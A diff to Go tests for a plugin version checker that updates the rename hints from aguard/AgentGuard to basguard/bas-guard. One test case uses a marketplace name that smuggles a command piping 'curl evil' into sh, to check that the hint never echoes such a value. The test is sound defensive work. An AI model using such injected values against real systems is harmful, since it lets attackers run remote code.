@@ -778,14 +778,15 @@ func TestPluginVersionLine(t *testing.T) {
 	}
 }
 
-// TestPluginVersionLine_LegacyName: through v0.16.0 the plugin was `agentguard`; it was renamed
-// because that name collides with the marketplace name in the install cache (issues/022). An
-// install under the old name is never updated again — the marketplace no longer lists it — so it
-// can never report "newer than this binary" and the user would never hear that the binary fell
-// behind. It must be told to switch, whatever the versions say. And an old install left next to
-// the new one duplicates every skill, which turns each bare skill name ambiguous in the gate.
+// TestPluginVersionLine_LegacyName: the plugin was `agentguard` through v0.16.0 (renamed because
+// that name collides with the marketplace name in the install cache, issues/022) and `aguard`
+// through v0.29 (the rename to BAS Guard, P-082). An install under an old name is never updated
+// again — the marketplace no longer lists it — so it can never report "newer than this binary"
+// and the user would never hear that the binary fell behind. It must be told to switch, whatever
+// the versions say. And an old install left next to the new one duplicates every skill, which
+// turns each bare skill name ambiguous in the gate.
 func TestPluginVersionLine_LegacyName(t *testing.T) {
-	legacyHome := legacyBundleName + "@" + homeMarketplace
+	current := pluginBundleName + "@" + homeMarketplace
 	cases := []struct {
 		name    string
 		ids     map[string]string
@@ -794,37 +795,46 @@ func TestPluginVersionLine_LegacyName(t *testing.T) {
 		notWant []string
 	}{
 		{
-			name:    "old name from this marketplace",
-			ids:     map[string]string{legacyHome: "0.16.0"},
-			binary:  "v0.17.0",
-			want:    []string{"old name", "claude plugin install aguard@AgentGuard", "claude plugin uninstall agentguard@AgentGuard"},
-			notWant: []string{"claude plugin update", "marketplace add"},
-		},
-		{
-			name:    "old name from the retired guard marketplace",
-			ids:     map[string]string{legacyBundleName + "@guard": "0.8.5"},
-			binary:  "v0.17.0",
-			want:    []string{"claude plugin marketplace add basdotio/AgentGuard", "claude plugin install aguard@AgentGuard", "claude plugin uninstall agentguard@guard"},
+			name:   "aguard from the pre-rename marketplace: uninstall, drop the marketplace, add the new one",
+			ids:    map[string]string{"aguard@AgentGuard": "0.29.0"},
+			binary: "v0.30.0",
+			want: []string{"old name", "since 0.30.0 it is basguard",
+				"claude plugin uninstall aguard@AgentGuard && claude plugin marketplace remove AgentGuard && " +
+					"claude plugin marketplace add basdotio/bas-guard && claude plugin install basguard@bas-guard"},
 			notWant: []string{"claude plugin update"},
 		},
 		{
+			name:    "agentguard from the pre-rename marketplace",
+			ids:     map[string]string{"agentguard@AgentGuard": "0.16.0"},
+			binary:  "v0.30.0",
+			want:    []string{"old name", "since 0.17.0 it is basguard", "claude plugin uninstall agentguard@AgentGuard", "claude plugin install basguard@bas-guard"},
+			notWant: []string{"claude plugin update"},
+		},
+		{
+			name:    "agentguard from the retired guard marketplace",
+			ids:     map[string]string{"agentguard@guard": "0.8.5"},
+			binary:  "v0.30.0",
+			want:    []string{"claude plugin marketplace add basdotio/bas-guard", "claude plugin install basguard@bas-guard", "claude plugin uninstall agentguard@guard"},
+			notWant: []string{"claude plugin update", "marketplace remove"},
+		},
+		{
 			name:    "old name, versions equal: still told to switch",
-			ids:     map[string]string{legacyHome: "0.17.0"},
-			binary:  "v0.17.0",
-			want:    []string{"old name", "claude plugin install aguard@AgentGuard"},
+			ids:     map[string]string{"aguard@AgentGuard": "0.30.0"},
+			binary:  "v0.30.0",
+			want:    []string{"old name", "claude plugin install basguard@bas-guard"},
 			notWant: []string{"matches"},
 		},
 		{
 			name:   "old name, dev build: still told to switch",
-			ids:    map[string]string{legacyHome: "0.16.0"},
+			ids:    map[string]string{"aguard@AgentGuard": "0.29.0"},
 			binary: "dev",
-			want:   []string{"old name", "claude plugin install aguard@AgentGuard"},
+			want:   []string{"old name", "claude plugin install basguard@bas-guard"},
 		},
 		{
-			name:    "both installed: compare the new one, remove the old one",
-			ids:     map[string]string{pluginBundleName + "@" + homeMarketplace: "0.17.0", legacyHome: "0.16.0"},
-			binary:  "v0.17.0",
-			want:    []string{"plugin aguard 0.17.0 matches this binary", "claude plugin uninstall agentguard@AgentGuard"},
+			name:    "current and both old names installed: compare the current one, remove each old one",
+			ids:     map[string]string{current: "0.30.0", "aguard@AgentGuard": "0.29.0", "agentguard@AgentGuard": "0.16.0"},
+			binary:  "v0.30.0",
+			want:    []string{"plugin basguard 0.30.0 matches this binary", "claude plugin uninstall aguard@AgentGuard", "claude plugin uninstall agentguard@AgentGuard"},
 			notWant: []string{"claude plugin install"},
 		},
 	}
@@ -846,9 +856,9 @@ func TestPluginVersionLine_LegacyName(t *testing.T) {
 // TestRenameHint_Desktop: a desktop install under the old name is switched in the desktop app,
 // never with a CLI command — the desktop store is not where `claude plugin` installs.
 func TestRenameHint_Desktop(t *testing.T) {
-	for _, mk := range []string{homeMarketplace, "guard"} {
-		got := renameHint(collect.PluginInstall{Marketplace: mk, Desktop: true})
-		if !strings.Contains(got, "Customize") || !strings.Contains(got, "aguard") || strings.Contains(got, "claude plugin") {
+	for _, mk := range []string{homeMarketplace, legacyMarketplace, "guard"} {
+		got := renameHint(collect.PluginInstall{Marketplace: mk, Desktop: true}, "aguard")
+		if !strings.Contains(got, "Customize") || !strings.Contains(got, "basguard") || strings.Contains(got, "claude plugin") {
 			t.Errorf("desktop, marketplace %s: %q, want the Customize panel and no CLI command", mk, got)
 		}
 	}
@@ -868,29 +878,29 @@ func TestUpdateHint(t *testing.T) {
 	}{
 		{
 			name: "cli, this repository's marketplace",
-			in:   collect.PluginInstall{Marketplace: "AgentGuard"},
-			want: []string{"`claude plugin update aguard@AgentGuard`"},
+			in:   collect.PluginInstall{Marketplace: "bas-guard"},
+			want: []string{"`claude plugin update basguard@bas-guard`"},
 		},
 		{
 			name: "cli, a marketplace that is not this project's",
 			in:   collect.PluginInstall{Marketplace: "some-fork"},
 			want: []string{
-				"claude plugin marketplace add basdotio/AgentGuard",
-				"claude plugin install aguard@AgentGuard",
-				"claude plugin uninstall aguard@some-fork",
+				"claude plugin marketplace add basdotio/bas-guard",
+				"claude plugin install basguard@bas-guard",
+				"claude plugin uninstall basguard@some-fork",
 			},
 			notWant: []string{"claude plugin update"},
 		},
 		{
 			name:    "desktop, this repository's marketplace",
-			in:      collect.PluginInstall{Marketplace: "AgentGuard", Desktop: true},
+			in:      collect.PluginInstall{Marketplace: "bas-guard", Desktop: true},
 			want:    []string{"Customize"},
 			notWant: []string{"claude plugin"},
 		},
 		{
 			name:    "desktop, a marketplace that is not this project's",
 			in:      collect.PluginInstall{Marketplace: "some-fork", Desktop: true},
-			want:    []string{"Customize", "basdotio/AgentGuard"},
+			want:    []string{"Customize", "basdotio/bas-guard"},
 			notWant: []string{"claude plugin"},
 		},
 		{
@@ -898,13 +908,13 @@ func TestUpdateHint(t *testing.T) {
 			// model: anything that is not a plain name is not repeated back, not even quoted.
 			name:    "cli, a marketplace name that is not a plain name",
 			in:      collect.PluginInstall{Marketplace: "x`\n; curl evil | sh"},
-			want:    []string{"claude plugin install aguard@AgentGuard"},
+			want:    []string{"claude plugin install basguard@bas-guard"},
 			notWant: []string{"curl", "\n", "claude plugin uninstall"},
 		},
 		{
 			name:    "cli, no marketplace recorded",
 			in:      collect.PluginInstall{},
-			want:    []string{"claude plugin install aguard@AgentGuard"},
+			want:    []string{"claude plugin install basguard@bas-guard"},
 			notWant: []string{"claude plugin uninstall"},
 		},
 	}
